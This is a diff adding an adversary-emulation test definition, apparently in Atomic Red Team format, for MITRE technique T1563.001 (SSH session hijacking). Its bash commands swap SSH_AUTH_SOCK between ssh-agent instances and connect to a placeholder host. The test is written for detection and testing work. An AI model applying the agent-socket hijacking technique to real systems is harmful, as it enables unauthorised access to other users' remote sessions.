@@ -1,0 +1,37 @@
+attack_technique: T1563.001
+display_name: 'Remote Service Session Hijacking: SSH Hijacking'
+atomic_tests:
+- name: SSH Session Hijacking via SSH_AUTH_SOCK
+  auto_generated_guid: 7819dc90-13da-4c7d-bc6d-f8de5e872ae6
+  description: |
+    This test simulates an SSH session hijacking by starting a new ssh-agent and using its SSH_AUTH_SOCK for the hijacking process.
+  supported_platforms:
+  - linux
+  input_arguments: {}
+  dependency_executor_name: bash
+  dependencies:
+  - description: |
+      Ensure ssh is available on the system
+    prereq_command: |
+      which ssh
+    get_prereq_command: |
+      sudo apt-get update && sudo apt-get install -y ssh
+  executor:
+    name: bash
+    # TODO: parametrize remote ssh host
+    elevation_required: false
+    command: |
+      # Start a new ssh-agent instance and capture its SSH_AUTH_SOCK
+      eval $(ssh-agent -s)
+      OLD_SSH_AUTH_SOCK=$SSH_AUTH_SOCK
+      # Kill the initial ssh-agent and start a new one to simulate hijacking
+      eval $(ssh-agent -k)
+      eval $(ssh-agent -s)
+      NEW_SSH_AUTH_SOCK=$SSH_AUTH_SOCK
+      # Temporarily switch back to the old SSH agent to simulate an application using the outdated socket
+      export SSH_AUTH_SOCK=$OLD_SSH_AUTH_SOCK
+      # Simulate SSH session hijacking by switching to the new SSH_AUTH_SOCK
+      SSH_AUTH_SOCK=$NEW_SSH_AUTH_SOCK ssh username@target_host 2>/dev/null
+    cleanup_command: |
+      eval $(ssh-agent -k)
+
